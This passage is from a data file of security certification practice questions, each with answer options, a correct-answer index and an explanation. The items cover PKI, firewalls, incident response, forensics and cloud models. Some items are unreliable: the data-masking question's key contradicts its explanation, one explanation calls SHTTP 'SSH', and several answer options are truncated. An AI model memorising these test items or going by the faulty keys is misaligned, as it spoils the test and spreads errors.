'correct':2,'explanation': 'OCSP stapling (or stapling, certificate stapling, or previously TLS Certificate Status Request) is a means of checking the revocation status of X.509 digital certificates. This mechanism enables the presenter of a certificate to append or staple a time-stamped OCSP response signed by the issuing CA. This stapling process allows the client or recipient to verify the revocation status of the offered digital certificate without having to interact with the issuing CA’s OCSP server directly. A certificate revocation list (CRL) is a CA’s database of revoked or canceled certificates. However, if the OCSP server is unreachable, switching to allowing clients to download the CRL is likely to fair no better as the same CA server hosting the CRL can be attacked by the DoS. Pinning, or HTTP Public Key Pinning (HPKP), is a depreciated security mechanism that is no longer supported by modern browsers. It was a means to predistribute certificates that are retained by a client (i.e., pinned), but it could be exploited by providing a false certificate to a visitor the first time. Also, pinning does not address revocation status. A wildcard certificate provides validation for all subdomains under a registered domain, which is not a relevant concern for this scenario.',},
{ 'question': '  A ________ firewall monitors the state or session of the communication, and it evaluates previous packets and potentially other communications and conditions when making an allow-or-deny decision for the current packet. ','answers': ['Stateless','Circuit level','Stateful','Application layer',],
'correct':3,'explanation': 'A stateful firewall monitors the state or session of the communication, and it evaluates previous packets and potentially other communications and conditions when making an allow-or-deny decision for the current packet.',},
{ 'question': '  A security administrator suspects that a recent intrusion resulted in data from a sensitive server that has been exfiltrated. What tool could be used to assist in confirming this hypothesis? ','answers': ['Account review','Risk mitigation','Mobile metadata','Log analysis',],
'correct':4,'explanation': 'Log analysis is likely the best tool to use in this scenario. The activity of the exfiltrated data should have resulted in numerous entries in one or more log files, which can be discovered using log analysis. Account review focuses on assessing whether a user account has the correct permissions for their job description. It is not a relevant tool in this scenario. Risk mitigation is the implementation of a risk response after identifying a new security threat. This tool is not relevant at this point in the investigation in this scenario. Mobile metadata is not relevant to this scenario.',},
{ 'question': '  A security manager is implementing technologies to prohibit rogue devices from gaining network access. After installing a NAC, what additional tool would be able to ensure that only known and authenticated systems gain connectivity? ','answers': ['IEEE 802.1x','PFX','CRL','PEAP',],
'correct':1,'explanation': 'IEEE 802.1x provides port-based access control and is useful both on wired and wireless connections to block access to systems and users that are unknown or which fail authentication. It is a common companion to NAC implementations. PFX or PKCS #12 is a certificate format and not relevant to this scenario. CRL is used to confirm whether certificates are revoked, which does relate to blocking access to systems or users whose certificates have been canceled, but CRL on its own in insufficient and would need to be implemented in concert with a PKI solution and/or 802.1x. PEAP provides for TLS encrypted EAP methods, but it is not specifically useful in keeping out rogue devices.',},
{ 'question': '  Which of the following features commonly found on a mobile phone may prevent an unauthorized thief from gaining access to sensitive information? ','answers': ['Screen lock','Disabling location tracking','Remote wipe','GPS tracking',],
'correct':3,'explanation': 'A remote wipe may allow you to remove all device contents once the mobile phone is reported missing or stolen. Screen lock is not a true security measure in regard to preventing data access unless it is paired with full device encryption. Disabling location tracking will not prevent a theft from accessing data on the device. GPS tracking will not prevent access to sensitive information.',},
{ 'question': '  Which of the following is a Department of Homeland Security (DHS) initiative that endeavors to facilitate the open and free exchange of IoCs and other cyberthreat information between the US federal government and the private sector in an automated and timely manner? ','answers': ['RFC','TTP','AIS','SOAR',],
'correct':3,'explanation': 'Automated indicator sharing (AIS) is an initiative by the Department of Homeland Security (DHS) to facilitate the open and free exchange of IoCs and other cyberthreat information between the US federal government and the private sector in an automated and timely manner. Request for comments (RFC) is a type of document drafted by someone (individuals and organizations) in the technical community that defines, describes, and prescribes technology specifications. Tactics, techniques, and procedures (TTP) is the collection of information about the means, motivations, and opportunities related to APTs. The goal of collecting TTP information is to gain a fuller understanding of who the group is, what their purposes and intentions are, as well as discovering their reconnaissance and attack techniques. Security orchestration, automation, and response (SOAR) is a collection of software solutions that can automate the process of collecting and analyzing log and real-time data, evaluate it in light of materials from threat intelligence sources, and then trigger response to low and mid-level severity issues without the need for human involvement.',},
{ 'question': '  The chief security officer (CISO) of a multinational financial group is developing a plan to improve the IT infrastructure throughout the corporation. The IT system is based on a central cloud solution where most of the organization’s data is currently store. At each physical location are small numbers of servers designed to handle a few days’ worth of data processing in the event of a cloud disconnect. These local IT facilities are able to process customer transactions, support ATM operations, and even provide mobile banking capabilities. The CISO is aware that almost every country where they have a physical location has differing data retention regulations and privacy restrictions. Which of the following changes should be implemented to provide the MOST protection for the organization’s data? ','answers': ['Revoke all existing root certificates and issue new certificates to each customer from a public CA. Ensure that all transactions are digitally signed and are using en','Apply the most rigorous encryption regulations to all data storage and transactions, replicate all data between all physical locations, and maintain transaction log','Redesign the storage of customer data to be retained within the appropriate national borders, use end-to-end encryption between every location and remote elem','Integrate a second cloud hosting provider and implement a replication process, and ensure that the cloud to cloud data transfers are end-to-end encrypted. Repl',],
'correct':3,'explanation': 'The key to this question is the statement that this organization is multinational and that it has to manage data from multiple different legal jurisdictions with varying data retention regulations and privacy restrictions. Thus, the only answer is one that directly addresses this concern, which is to redesign the IT solutions to restrict data to the appropriate national borders. Most of the other options may be generally good security concepts, but due to the requirements of data sovereignty, they are not compliant with the legal limitations.',},
{ 'question': '  As a security auditor, you are needing to evaluate network communications for suspicious and violating activity. You want to track communications by IP address as well as a priority level or service class. The collected data should include payload protocol, port used, and various protocol header details. There should be indications whether IP, TCP, UDP, and ICMP protocols are in use and whether they relate to specific instances of concern. IT would also be helpful if a single tool could perform this operation across numerous network devices and group collected data by specific communication sessions. What tool or feature would fulfil these requirements? ','answers': ['rsyslog','journalctl','NXLog','Netflow',],
'correct':4,'explanation': 'Netflow is a traffic monitoring feature on Cisco routers and switches. Netflow tracks the IP addresses of packets as well as service class (i.e., priority level 0–7), payload protocol, ports, ICMP type and code, miscellaneous protocol header information, and potential causes of network congestion. Netflow monitors traffic by grouping communications into flows. A flow is traffic that shares seven values in common: ingress interface, source IP address, destination IP address, IP version, source port, destination port, and IP type of service (ToS). The other tools do not fulfil these requirements. Rsyslog is an open-source syslog utility for Unix and Linux systems. The command journalctl is used to view the contents of logs generated by systemd on *nix systems. The output of this tool is similar to that of syslog, in that the output includes date and time of the event, hostname, process name, then log message. The NXLog tool is a log management tool available on most OSes. This tool can function similarly to syslog, but it not limited to syslog file formats. NXLog can handle logs in nearly any format and perform rewrite, correlation, alerting, and pattern matching.',},
{ 'question': '  Which of the following depends on ephemeral keys? ','answers': ['Digital certificates','Perfect forward secrecy','Whole-drive encryption','Integrity protection',],
'correct':2,'explanation': 'Perfect forward secrecy is a means of ensuring that the compromise of an entity’s digital certificates or public/private key pairs does not compromise the security of any session keys. Perfect forward secrecy is implemented by using ephemeral keys for each and every session, generated at the time of need, and then only using for a specific period of time or volume of data transfer before being discarded and replaced.',},
{ 'question': '  A security breach has been detected between an internal system and one of the database servers in the cluster group. The 2000+ client devices connect via WiFi. The IRT team needs to implement a containment strategy. Which option will have the best result with the least negative impact? ','answers': ['Power down the WAPs.','Unplug the network cable from the database server.','Disconnect from the Internet.','Push a patch to all systems.',],
'correct':2,'explanation': 'The best containment option in this situation is to unplug the network cable from the database server. Since the database server is a member of a cluster, other duplicate servers will remain online to continue to serve the users. But this will terminate the current attack. Powering down the WAPs would stop the attack, but it would also disconnect all clients, which means all worker production is interrupted. Disconnecting from the Internet won’t affect the attack and would likely interrupt valid activities. Pushing out a patch is not effective here as there is no information on what the attack is and whether a patch would be a relevant remediation. Usually pathing is part of recovery, not containment.',},
{ 'question': '  When evaluating a CSP, which of the following is the most important security concern? ','answers': ['Data retention policy','Number of customers','Hardware used to support VMs','Whether they offer MaaS, IDaaS, and SaaS',],
'correct':1,'explanation': 'The most important security concern from this list of options in relation to a CSP is the data retention policy. What information or data is being collected by the CSP, for how long will it be kept, how is it destroyed, why is it kept, and who can access it? The number of customers and what hardware is used are not significant security concerns in comparison to data retention. Whether the CSP offers MaaS, IDaaS, and SaaS is not as important as data retention, especially if these are not services your organization needs or wants. One of the keys to answering this question is to consider the range of CSP options, including SaaS, PaaS, and IaaS; and the type of organizations that are technically CSP SaaS but which we don’t often think of as such, examples include Facebook, Google, and Amazon. These organizations absolutely have access to customer/user data, and thus their data retention policies are of utmost concern (at least compared to the other options provided).',},
{ 'question': '  A company is developing a new product to perform simple automated tasks related to indoor gardening. The device will be able to turn lights on and off and control a pump to transfer water. The technology to perform these automated tasks needs to be small and inexpensive. It only needs minimal computational capabilities, does not need networking, and should be able to execute C++ commands natively without the need of an OS. Which of the following is the best choice to use for this new product? ','answers': ['Arduino','RTOS','Raspberry Pi','FPGA',],
'correct':1,'explanation': 'Arduino is an open-source hardware and software organization that creates single-board 8-bit microcontrollers for building digital devices. An Arduino has limited RAM, a single USB port, I/O pins for controlling additional electronics (such as servo motors or LED lights), and does not include an OS or support networking. Instead, Arduino can execute C++ programs specifically written to its limited instruction set. Raspberry Pi is a popular example of a 64-bit microcontroller or a single-board computer, which includes its own custom OS, but many third-party OS alternatives are available. A Raspberry Pi has significantly more processing power than Arduino, is not limited to executing C++ programs, supports networking, and is more expensive than Arduino. Thus, a Raspberry Pi is not the best option for this scenario. A real-time operating system (RTOS) is designed to process or handle data as it arrives on the system with minimal latency or delay. RTOS is a software OS that is usually stored and executed from ROM. An RTOS is designed for mission-critical operations where delay must be eliminated or minimized for safety. Thus, RTOS is not the best option for this scenario. A fieldprogrammable gate array (FPGA) is a flexible computing device intended to be programmed by the end-user or customer. FPGAs are often used as embedded devices in a wide range of products, including industrial control systems (ICS). FPGA can be challenging to program and are often more expensive that other more limited solutions. Thus, FPGA is not the best fit for this scenario.',},
{ 'question': '  A new local VDI has been deployed in the organization. There had been numerous breaches of security due to issues on typical desktop workstations and notebook computers used as endpoints. Many of these issues stemmed from users installing unapproved software or altering the configuration of essential security tools. In an effort to avoid security compromises originating from endpoints in the future, all endpoint devices are now used exclusively as dumb terminals. Thus, no local data storage or application execution is performed on endpoints. Within the VDI, each worker has been assigned a VM containing all of their business necessary software and data sets. These VMs are configured to block the installation and execution of new software code, data files cannot be exported to the actual endpoints, and each time a worker logs out, the used VM is discarded, and a clean version copied from a static snapshot replaces it. What type of system has now been deployed for the workers to use? ','answers': ['Cloud services','Nonpersistent','Thin clients','Fog computing',],
'correct':2,'explanation': 'This scenario describes the systems as being nonpersistent. A nonpersistent system or static system is a computer system that does not allow, support, or retain changes. Thus, between uses and/or reboots, the operating environment and installed software are the same. Changes may be blocked or simply discarded after each system use. A nonpersistent system is able to maintain its configuration and security in spite of user attempts to implement change. This scenario is not describing a cloud solution, although a virtual desktop interface (VDI) could be implemented on-premises or in the cloud. This scenario is not describing thin clients, as the existing “standard” PC endpoints are still in use, but a VDI is being used instead of the local system capabilities. A VDI deployment simulates a thin client. This scenario is not describing fog computing. Fog computing relies upon sensors, IoT devices, or even edge computing devices to collect data and then transfer it back to a central location for processing.',},
{ 'question': '  During an investigation, a system is discovered as having a wealth of evidence. What data should be preserved first? ','answers': ['Paging file','Internet cache','Network connection information','Temporary files on network shares',],
'correct':3,'explanation': 'The order of volatility of evidence collection indicates that network connection information is the most volatile from this list of options. The paging file and Internet cache (likely files from a web browser) are on a storage device, which is less volatile than anything that exists only in memory. Temporary files on network shares is of similar volatility to data on local storage devices.',},
{ 'question': '  What is the programmatic activity of retrieving the value stored in a memory location by triggering the pulling of the memory based on its address or location as stored in a pointer? ','answers': ['DLL injection','Pointer dereferencing','Integer overflow','Pivot',],
'correct':2,'explanation': 'Pointer dereferencing is the programmatic activity of retrieving the value stored in a memory location by triggering the pulling of the memory based on its address or location as stored in a pointer.',},
{ 'question': '  The basis of reliable continuity of operation plans, disaster recovery plans, and business continuity plans is ___________. ','answers': ['User awareness','A warm alternate site','Backups','Redundant hardware',],
'correct':3,'explanation': 'Backups form the basis of reliable continuity of operation plans (COOP), disaster recovery plans (DRP), and business continuity plans (BCP). User awareness, warm alternate sites, and redundant hardware may improve or be a part of COOP, DRP, and BCP, but they aren’t essential like backups.',},
{ 'question': '  After attending a security conference, the CISO updates the security policy in regards to the use of smart cards. The new requirements are that cards are to be updated yearly and that both a PIN and a fingerprint scan must be used for system authentication. What type of security control is this policy? ','answers': ['Detective','Physical','Managerial','Technical',],
'correct':3,'explanation': 'The policy is a managerial control. Managerial controls focus on the management of risk and thus the governance of organizational security. Often managerial controls are established using administrative means. These controls focus on personnel and business practices. Even when the policy is defining a technical or physical security mechanism, it is still a managerial control. A detective control is a security mechanism that takes notice of events and may respond when a violating incident occurs. Physical controls focus on protecting the facility. Technical controls protect the IT/IS.',},
{ 'question': '  A CISO is setting up a new location that the organization will move into in three months. The IT environment from the current location was cloned and installed into the new facility. Then, upgrades, expansions, and additions were added based on predicted needs and a change in company mission once the move is complete. The CISO is concerned that the changes may have introduced security vulnerabilities. Which of the following forms of assessment will provide the CISO with a list of specific exploits that were actually able to successfully compromise the new network environment? ','answers': ['Two-person review','Risk assessment','Penetration testing','Business continuity planning',],
'correct':3,'explanation': 'Only penetration testing will actually prove that specific exploits were able to successfully compromise a target. Pen testing is the best option in this scenario because it is a nonproduction (or preproduction) environment, probably does not have valuable data, and there are no end-users. Two-person review is a type of software static code analysis, which is not the current technique for this scenario. Risk assessment is usually a paper-based evaluation of an organization’s assets, threats, and risks to triage the critical concerns and allocate limited resources to affect a reasonable security strategy. It does not actually use exploits to test actual systems. BCP is a paper-based risk assessment that focuses on business processes to craft a response plant to survive, sustain, and normalize operations in the event of a modestly harmful incident. It also does not use exploits to test actual systems.',},
{ 'question': '  A company demonstrated a new ML system that evaluates uploaded photos and recommends clothing options, hair styles, jewelry, and other accessories to go with their complexion, hair color, and general facial characteristics. However, several users report that their photos are not recognized and fail to get any recommendations. Upon investigation, the company discovers that photos of dark-skinned people are being ignored by the ML system. What is the reason for this issue? ','answers': ['Fileless malware','Pretexting','Resource exhaustion','Tainted training data',],
'correct':4,'explanation': 'The most likely reason for this issue is the ML system was provided tainted training data. The training data may have contained imagery of only lightskinned people, thus causing it to not recognize darker skin colors. This issue is not caused by fileless malware, which is memory-resident only malicious code. This issue is not related to pretexting, which is a social engineering technique to establish a believable story to fool or trick the victim. This is not resource exhaustion, which is when applications are allowed to operate in an unrestricted and unmonitored manner so that all available system resources are consumed in the attempt to serve the requests of valid users or in response to a DoS attack.',},
{ 'question': '  A worker contacts the help desk to complain about an open window on their desktop that won’t close. The help-desk person has the worker reboot their Windows computer. Immediately after the worker logs back into the rebooted computer, the window opens again. The help-desk person remotes into the system and notices a .ps1 file located in the Startup folder. The help-desk person realizes that this is not a standard condition and the system is not in compliance with the company’s security baseline. What is causing the unwanted behavior on the worker’s system? ','answers': ['A boot Bash file','A document macro','An email attachment of a VBA script','A rogue PowerShell script',],
'correct':4,'explanation': 'This situation is describing a PowerShell script, which uses the file extension of .ps1, which is located in the Startup folder on Windows machine, which causes that script to auto-execute upon logon. Since this script is not part of the standard company configuration for workstations, it is obviously a rogue script. This is not a Bash file, as those use a .sh extension. This is not a document macro, as those are embedded in document files rather than having their own file with an extension. This is not a VBA script that is an email attachment, as an email attachment would not be on the file system yet; it would still be attached to the email, and VBA scripts use .vba file extensions when saved as a file, but are often macros in Microsoft Office applications and documents.',},
{ 'question': '  When TLS is being used to secure web communications, what URL prefix appears in the web browser address bar to signal this fact? ','answers': ['SHTTP://','TLS://','FTPS://','HTTPS://',],
'correct':4,'explanation': 'HTTPS:// is the correct prefix for the use of Hypertext Transfer Protocol (HTTP) over Transport Layer Security (TLS). This was the same prefix when Secure Sockets Layer (SSL) was used to encrypt HTTP, but SSL has been deprecated. SHTTP:// is for Secure HTTP, which was SSH, but SHTTP is also deprecated. TLS:// is an invalid prefix. FTPS:// is a valid prefix that can be used in some web browsers, and it uses TLS to encrypt the connection, but it is for securing FTP file exchange rather than web communications.',},
{ 'question': '  What means of implementing security focuses on discovering or detecting unwanted or unauthorized activity? ','answers': ['Deterrent','Recovery','Compensation','Detective',],
'correct':4,'explanation': 'A detective control is deployed to discover or detect unwanted or unauthorized activity. Detective controls operate after the fact and can discover the activity only after it has occurred. The other options are incorrect. Recovery controls are an extension of corrective controls but have more advanced or complex abilities to repair damage to return a system to normal. A compensation control is deployed to provide various options to other existing controls to aid in enforcement and support of security policies. It can be any control used in addition to, or in place of, another control. A detective control is deployed to discover or detect unwanted or unauthorized activity.',},
{ 'question': '  An organization stores group project data files on a central SAN. Many projects have numerous files in common, but are organized into separate different project containers. A member of the incident response team is attempting to recover files from the SAN after a malware infection. However, many files are unable to be recovered. What is the most likely cause of this issue? ','answers': ['Using Fibre Channel','Performing real-time backups','Using file encryption','Deduplication',],
'correct':4,'explanation': 'The most likely cause of the inability to recover files from the SAN in this scenario is deduplication. Deduplication replaces multiple copies of a file with a pointer to one copy. If the one remaining file is damaged, then all of the linked copies are damaged or inaccessible as well. File encryption could be an issue, but the scenario mentions that groups of people work on projects and typically file encryption is employed by individuals not by groups. Wholedrive encryption would be more appropriate for group accessed files as well as for a SAN in general. This issue is not related to what SAN technology is used, such as Fibre Channel. This problem might be solvable by restoring files from a backup, whether real time or not, but the loss of files is not caused by performing backups.',},
{ 'question': '  A small company recently deployed its first WAP to support mobile devices connecting into the company network. However, users more than 10 feet away from the base station report that they are unable to maintain a connection to the WAP. The network administrator confirms that the WAP is set up correctly, the antennas are properly oriented, and they are set to a proper signal strength level. What is likely causing the problem? ','answers': ['The mobile devices only support WPA.','WPS was not used to connect the new devices.','The building is surrounded by a Faraday cage.','A nearby network is using the same configuration.',],
'correct':4,'explanation': 'This scenario is describing the situation where a nearby network is using the same configuration that is causing interference and effectively jamming the network. When the mobile devices are very close (~10 feet or less) away from the WAP, the signal is strong enough to overcome the interference, but further away the interference makes maintaining a connection impossible. This situation is effectively an inadvertent jamming event caused by the other WAP of the nearby network. This is not an issue with WPA, and most mobile devices that would be allowed on a company WiFi network would support WPA2. WPS does not need to be used to connect devices for them to maintain a connection; WPS is a feature for convenience not necessity when adding in lots of new devices to a WiFi network. If the building were surrounded by a Faraday cage, this would not affect this situation if the other company’s WAP was inside the same building. Since the question indicates that this is a small company, it is more likely that they are in a multitenant office building rather than in a building where they are the sole occupants. If, however, a Faraday cage surrounded this company’s offices (its rooms within the shared building), then it would eliminate the interference by preventing the signals from either WAP from crossing the emanations barrier.',},
{ 'question': '  The best way to respond to security violations is to __________. ','answers': ['Notify law enforcement immediately','Turn off all servers','Initiate a lockdown so no employees can enter or leave the facility','Have an incident response plan to follow',],
'correct':4,'explanation': 'The best way to respond to security violations is to have an incident response plan to follow. The incident response plan may instruct you to contact law enforcement, turn off servers, or initiate a lockdown, but only if the situation requires such actions.',},
{ 'question': '  A large manufacturer is deploying various sensors and devices throughout its operation to monitor and remotely control certain aspects of its operations. It is essential that all data collected by these devices be analyzed on a central server. What type of system is likely being installed? ','answers': ['Edge computing','MSSP','Microservices','Fog computing',],
'correct':4,'explanation': 'This situation is describing a fog computing deployment. Fog computing relies upon sensors, IoT devices, or even edge computing devices to collect data and then transfer it back to a central location for processing. In edge computing, the intelligence and processing is contained within each device. This is not specifically a managed security service provider (MSSP) as there is no mention of a third-party performing the data collection and analysis nor any mention of cloud integration. This is also not microservices as the situation is focusing on deploying hardware rather than crafting new applications out of software.',},
{ 'question': '  As the IT manager for a large enterprise, you have been tasked with upgrading the worker desktop and notebook systems. The CISO recommends using a system imaging solution to accomplish this operation more efficiently. What security benefit is gained by following this suggestion? ','answers': ['Eliminates the need for subsequent patching','Allows for all systems to be updated simultaneously','It blocks all future exploitations from external attackers','Ensures a consistent baseline across the upgraded endpoint devices',],
'correct':4,'explanation': 'The use of system imaging will ensure a consistent baseline across the upgraded endpoint devices, which is a security benefit. The use of system imaging will not eliminate the need to perform future patching. System imaging might allow for simultaneous deployment but that is not a security benefit. System imaging will not block future exploitations from external hackers. Only ongoing security management will potentially provide sufficient defense against future attacks.',},
{ 'question': '  A new office is being opened across town from the main headquarters. Workers in the new office will need to access the systems in the primary LAN. Which of the following is the best option? ','answers': ['Deploy an on-demand VPN.','Implement a site-to-site VPN.','Use a transport mode VPN.','Enable an end-to-end encryption VPN.',],
'correct':2,'explanation': 'The best option for this scenario is a site-to-site VPN, which is also known as a tunnel mode VPN, which provides link encryption. On-demand VPN is not a standard term, but may be a misdirection, and it seems similar to an always-on VPN, which is primarily used on mobile devices. A transport mode VPN is used between two individual devices, not two networks; this is also known as a host-to-host VPN, and it provides end-to-end encryption.',},
{ 'question': '  The CISO is reviewing the root cause analysis of a recent company breach. The report indicates that the intruder initially compromised the company web server located in a screened subnet. Then from the web server, they took advantage of the link from the web applications to the database server, which is located inside the private network. Once the database server was breached, the attacker compromised a file server. From the file server, they were able to access the development environment and download all of the source code of a new product that was to be announced and released next quarter. What type of attack event is the report describing? ','answers': ['Privilege escalation','Persistence','Reconnaissance','Lateral movement',],
'correct':4,'explanation': 'The report in this scenario is describing an attacker performing lateral movement. Lateral movement is the act of gaining remote access control or just remote code execution abilities on another system. These attacks may have involved privilege escalation, but here is no mention or indication of this type of attack technique in the report as presented here. Escalation of privilege or privilege escalation is any attack or exploit that grants the attacker greater privileges, permissions, or access that may have been achieved by the initial exploitation or that a legitimate user was assigned. Persistence is the characteristic of an attack that maintains long-term remote access to and control over a compromised target. Persistence is not evidenced in this scenario’s report as there is no mention of time or operations to establish long-term access and control over a target. Reconnaissance is learning as much as possible about a target before initiating direct interaction or attempting exploitation. That is not what this scenario’s report is showing; it is showing attacks.',},
{ 'question': '  Johnnie has been receiving numerous messages from applications and web services on her mobile device. These announcements often indicate a new message has been posted by someone she is following, show that a new comment has been made on a social network posting that she liked, and display offerings for her to purchase services or merchandise. All of these attention-grabbing notes seem to be related to apps and web services she uses frequently. What are these messages? ','answers': ['Geolocation data','Context-aware authentication','OTA updates','Push notifications',],
'correct':4,'explanation': 'These messages are examples of push notifications. Push notification services are able to send information to your device rather than having the device (or its apps) pull information from an online resource. Push notifications are useful in being notified about a concern immediately, but they can also be a nuisance if they are advertising or spam. Many apps and services can be configured to use push and/or pull notifications. Geolocation data not a way to describe these messages. Geolocation or geotagging is the ability of a mobile device to include details about its location in any media created by the device, such as photos, videos, and social media posts. These messages are not context-aware authentication. Context-aware authentication evaluates the origin and context of a user’s attempt to access a system. These messages are not OTA updates. Firmware OTA updates are firmware updates that are downloaded from the telco or vendor over the air (OTA).',},
{ 'question': '  When an investigator discovers a hard drive that might contain evidence related to a criminal investigation, what is used to create an exact duplicate of that storage device? ','answers': ['Hashing','Bitstream image','Undelete','Graceful shutdown',],
'correct':2,'explanation': 'A bitstream image is a process used to make an exact hash-matching copy of a storage device. Hashing itself does not create the copy; it can only be used to verify the copy as an exact duplicate. Undelete is not a backup tool but a potential recovery tool. Graceful shutdown is never part of a forensic investigation since software on the suspect’s system cannot be trusted.',},
{ 'question': '  A security incident has potentially compromised several endpoint devices. It is not clear how the attack occurred or which machines were affected. This is the first incident that the response team has been called upon to resolve. One of the team members asks for instructions on what do to in this situation. What should be provided to the IRT to guide their response and mitigation activities? ','answers': ['Standards','Certificates','Configuration documentation','Playbook',],
'correct':4,'explanation': 'A SOAR playbook is checklist of IR steps to be performed by the members of the IRT. A playbook often includes multiple different scenario/situation specific checklists that can be used based on the specific asset(s) and threat(s) involved in an incident. The other options are not the needed guide to perform mitigation steps in this scenario. A standards document is needed to assist with establishing baselines and system requirements, but it is not a guide to incident mitigation and response. Certificates are used to prove integrity; they are not a guide to incident mitigation and response. Configuration documentation may be useful during the investigation, but that information is not a guide to incident mitigation and response.',},
{ 'question': '  A major online data service wants to provide better response and access times for its users and visitors. They plan on deploying thousands of mini-web servers to ISPs across the nation. These mini-servers will each host the few dozen main pages of their website so that users will be routed to the logically and geographically closest server for optimal performance and minimal latency. Only if a user requests data not on these mini-servers will they be connecting to the centralized main web cluster hosted at the company’s headquarters. What is this type of deployment commonly known as? ','answers': ['Edge computing','Fog computing','Thin clients','Infrastructure as code',],
'correct':1,'explanation': 'This scenario is an example of edge computing. In edge computing, the intelligence and processing is contained within each device. Thus, rather than having to send data off to a master processing entity, each device can process its own data locally. The architecture of edge computing performs computations closer to the data source, which is at or near the edge of the network. Fog computing relies upon sensors, IoT devices, or even edge computing devices to collect data and then transfer it back to a central location for processing. A thin client is a computer with low to modest capability or a virtual interface that is used to remotely access and control a mainframe, virtual machine, or virtual desktop infrastructure (VDI). Infrastructure as code (IaC) is a change in how hardware management is perceived and handled. Instead of seeing hardware configuration as a manual, direct hands-on, one-on-one administration hassle, it is viewed as just another collection of elements to be managed in the same way that software and code are managed under DevOps.',},
{ 'question': '  Which of the following is a description of a key-stretching technique? ','answers': ['Salting input before hashing','Generating a random number and then using a trapdoor one-way function to derive a related key','Adding iterative computations that increase the effort involved in creating the improved result','Using a challenge-response dialogue',],
'correct':3,'explanation': 'Often, key stretching involves adding iterative computations that increase the effort involved in creating the improved key result, usually by several orders of magnitude. Salting input before hashing is a means to increase password security against brute-force attacks. Generating a random number and then using a trapdoor one-way function to derive a related key is the process of creating an asymmetric key pair set. Using a challenge-response dialogue is the basis of CHAP authentication.',},
{ 'question': '  _________________ is the process of adding new employees to the identity and access management (IAM) of an organization. This process is also used when the role or position of an employee changes or when an employee is awarded additional levels of privilege or access. ','answers': ['Reissue','Onboarding','Background checks','Site survey',],
'correct':2,'explanation': 'Onboarding is the process of adding new employees to the IAM of an organization. This process is also used when the role or position of an employee changes or an employee is awarded additional levels of privilege or access. Reissue is a certification function when a lost certificate is provided to the user by extracting it from the escrow backup database or when a certificate is altered to extend its expiration date. Background checks are used to verify that a job applicant is qualified but not disqualified for a specific work position. A site survey is used to optimize the placement of WAPs to provide reliable connectivity throughout the organization’s facilities.',},
{ 'question': '  The process of protecting data while it is being displayed to a worker by replacing original characters with asterisks is known as? ','answers': ['Data minimization','Data anonymization','Data tokenization','Data masking',],
'correct':2,'explanation': 'Data masking is the activity of attempting to obfuscate data through manipulation of its characters or content. Data minimization is the reduction of data collected or stored to the minimum necessary to perform essential business tasks. Anonymization or de-identification is a process by which PII is removed from a data set. Tokenization uses tokens (i.e., unique identifying symbols/characters) to represent sensitive data.',},
{ 'question': '  A project developer realizes that several of the functions and services of the company’s web offerings can be used to deploy several new capabilities. After obtaining approval, the developer creates software services out of these features and defines open APIs to interact with them. This change in their online infrastructure leads to a significant expansion of their online presences and assists them in becoming a dominate entity in their industry. What is the term or name for the new deployment crafted by this project developer? ','answers': ['MSP','Containerization','Micro-services','Serverless architecture',],
'correct':3,'explanation': 'The new deployment crafted by this project management can be labeled as micro-services. Micro-services are an emerging feature of web-based solutions and is derivative of service-oriented architecture (SOA). SOA constructs new applications or functions out of existing but separate and distinct software services. A micro-service is simply one element, feature, capability, business logic, or function of a web application that can be called upon or used by other web applications. Managed Service Provider (MSP) and Managed Security Service Provider (MSSP) are third-party (often cloud-based) services that provide remote oversight and management of on-premises IT or cloud IT. Containerization is based on the concept of eliminating the duplication of OS elements in a virtual machine. Instead, each application is placed into a container that includes only the actual resources needed to support the enclosed application and the common or shared OS elements are then part of the hypervisor. Serverless architecture is a cloud computing concept where code is managed by the customer and the platform (i.e., supporting hardware and software) or server is managed by the CSP. There is always a physical server running the code, but this execution model allows the software designer/architect/programmer/developer to focus on the logic of their code and not have to be concerned about the parameters or limitations of a specific server.',},
{ 'question': '  A security officer is reviewing the configuration of a central file server and discovers a hidden data folder. The data folder contains records of customers from the last four years, including name, address, phone, account number, birth dates, and more. Further investigations reveal log files that include records of these data files being transferred to an unknown server out on the Internet. What company policy was being violated in this scenario? ','answers': ['Retention policy','Privacy policy','Acceptable use policy','Data destruction policy',],
'correct':2,'explanation': 'This scenario describes a violation of a privacy policy. The data contained in the hidden folder’s files is customer PII, it seems to have been collected under suspicious circumstances, and it was exfiltrated to unknown locations for unknown purposes. This is not a violation of a retention policy. A retention policy defines what important data the company wants to protect through backups and archiving. A hidden folder of PII is not a valid means of data protection. This is a violation of an acceptable use policy in general, but since it deals with PII, it is more specifically a privacy policy violation. Also, there is no mention of the perpetrator, so they could be an insider or an external intruder. If it was an external intruder, the AUP would not apply, but it would still be a privacy violation. This scenario is not a violation of a data destruction policy. A data destruction policy defines what is to be purged from company records, how, and when.',},
{ 'question': '  A CTO is reviewing the configuration of a new system recently deployed in the company’s data center. It is using extremely high-end server hardware to support more than 40 server virtual machines. The goal of this server is to host a variety of essential company services as well as their related data management processes to improve productivity, efficiency, and potentially develop new capabilities. The CTO notices that there is a risk that malicious code infecting one of the VMs may be able to affect code and data operating in other hypervisor containers. What is the issue the CTO has discovered is missing from the new deployment? ','answers': ['Data sovereignty','VM escape protection','Guest OS malware scanning','Containerization',],
'correct':2,'explanation': 'In this scenario, the CTO has discovered that the deployment is missing VM escape protection. VM escaping occurs when software within a guest OS is able to breach the isolation protection provided by the hypervisor to violate the container of other guest OSs or to infiltrate a host OS. This is a serious concern that needs to be addressed before full deployment into production of this new infrastructure solution. This is not a data sovereignty issue. Data sovereignty is the concept that once information has been converted into a binary form and stored as digital files, it is subject to the laws of the country within which the storage device resides. Guest OS malware scanning may or may not be present in this new system design, but even with malware protection, new unknown zero-day malware could still infect a VM and then through an escape vulnerability affect other VMs. This is not a containerization issue. Containerization is based on the concept of eliminating the duplication of OS elements in a virtual machine. Instead, each application is placed into a container that includes only the actual resources needed to support the enclosed application, and the common or shared OS elements are then part of the hypervisor.',},
{ 'question': '  An investigator is at a cybercrime scene. While looking around the assigned workspace of the suspect, the investigator notices a memory card attached to the back of the monitor with tape. After taking a photo of the object and before placing it into an evidence collection container (such as a paper envelope), what should be done? ','answers': ['Review the rules of evidence.','Complete an evidence collection form.','Confirm that it is material.','Obtain a search warrant.',],
'correct':2,'explanation': 'After taking a photo of the object, the investigator should complete an evidence collection form. This may be a separate document or a portion of the chain of custody. Only once that is completed should the evidence then be collected. The rules of evidence (i.e., the requirements of US courts on whether evidence is admissible) should be known by the investigator prior to arriving at a crime scene. It won’t be possible to determine if evidence is material until it is analyzed; that occurs after collection. If the investigator is already collecting evidence, then they likely already have a search warrant or are operating under other legal authority to collect evidence, such as consent of the business owner.',},
